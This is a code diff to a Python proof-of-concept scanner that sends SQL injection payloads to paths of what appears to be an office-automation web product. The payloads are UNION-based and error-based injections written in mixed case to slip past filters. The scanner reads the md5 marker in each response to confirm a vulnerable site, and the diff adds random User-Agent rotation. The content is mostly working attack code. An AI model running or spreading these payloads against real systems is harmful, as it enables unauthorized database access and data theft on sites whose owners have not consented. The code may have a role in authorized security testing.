@@ -15,17 +15,19 @@ from gevent import monkey;monkey.patch_all()
 from gevent.pool import Pool
 from gevent.queue import Queue
 import requests
+import os
+import sys
 from urllib.parse import urlparse
 from requests.packages.urllib3 import disable_warnings
 disable_warnings()
+path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+sys.path.append(path)
+from modules import get_user_agent
 
 
 class poc:
     def __init__(self, url, proxies):
         self.url = url
-        self.headers = {
-            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
-        }
         self.payloads = [
     '/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17)%20UnIoN%20SeLeCt%201,2,md5(1234),1%23',
     '/HJ/iSignatureHtmlServer.jsp?COMMAND=DELESIGNATURE&DOCUMENTID=1&SIGNATUREID=2%27AnD%20(SeLeCt%201%20FrOm%20(SeLeCt%20CoUnT(*),CoNcaT(Md5(1234),FlOoR(RaNd(0)*2))x%20FrOm%20InFoRmAtIoN_ScHeMa.TaBlEs%20GrOuP%20By%20x)a)%23',
@@ -55,7 +57,10 @@ class poc:
             payload = self.q.get()
             try:
                 url = "{}{}".format(url, payload)
-                result = requests.get(url=url, headers=self.headers, verify=False, proxies=self.proxies)
+                headers = {
+                    'User-Agent': get_user_agent.get_user_agent(),
+                }
+                result = requests.get(url=url, headers=headers, verify=False, proxies=self.proxies)
                 if "81dc9bdb52d04dc20036dbd8313ed055" in result.text or "52d04dc20036dbd8" in result.text:
                     target = urlparse(url)
                     result_text += """\n        [+]    \033[32m检测到目标站点存在SQL注入漏洞\033[0m
